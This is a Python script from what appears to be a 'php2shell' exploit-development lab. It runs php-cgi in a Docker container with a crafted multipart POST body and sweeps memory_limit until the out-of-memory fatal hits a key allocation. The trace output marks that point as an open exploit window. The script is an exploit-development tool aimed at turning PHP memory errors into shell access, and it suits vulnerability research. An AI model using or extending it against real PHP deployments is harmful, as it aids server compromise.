#!/usr/bin/env python3
"""php2shell lab, oom29b: limit sweep over the fixed mixed-class key body.

Mechanism (measured): keys need FRESH pages every part; transients recycle
from bins. At free=0 the first fresh unservable ask takes the fatal.
Sweep memory_limit so the wall lands ON a key-class ask -> post-commit
window opens. Detect via trace (commit w/o ok) or fatal tried-size in key class.
"""
import re
import subprocess
import sys

sys.argv = ["x", "24M", "4000", "7"]
exec(open("/tmp/phplab/oom29.py").read().replace('if __name__ == "__main__":\n    main()', ''))

body = build()
subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", "cat > /tmp/body.bin"],
               input=body, capture_output=True, timeout=120)
print("body", len(body), flush=True)

CMD = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
       "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
       "/usr/src/php-8.2.34/sapi/cgi/php-cgi -d memory_limit=%d -d post_max_size=4096M "
       "-d max_input_vars=100000 </tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?")

lo = int(sys.argv_lo) if False else 22800000
for limit in range(lo, 25200000, 131072):
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", CMD % (len(body), limit)],
                       capture_output=True, timeout=300)
    rc = r.stdout.decode().strip()
    tr = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "cat /tmp/e.log"],
                        capture_output=True).stdout.decode("latin1")
    commits = re.findall(r"TRACE keycommit stage=1 elem=(\d+) free=(\d+)", tr)
    oks = len(re.findall(r"TRACE keyok", tr))
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    key_death = len(commits) > oks
    tag = "KEY-DEATH" if key_death else ("fatal:" + (tried[-1] if tried else "-") if "Allowed memory" in tr else "survive")
    print("limit=%d rc=%s commits=%s oks=%d lastfree=%s %s" %
          (limit, rc, commits[-1][0] if commits else "-", oks,
           commits[-1][1] if commits else "-", tag), flush=True)
    if key_death:
        idx = tr.rfind("TRACE keycommit")
        print("*** WINDOW OPEN ***")
        print(tr[idx:idx + 400])
        break
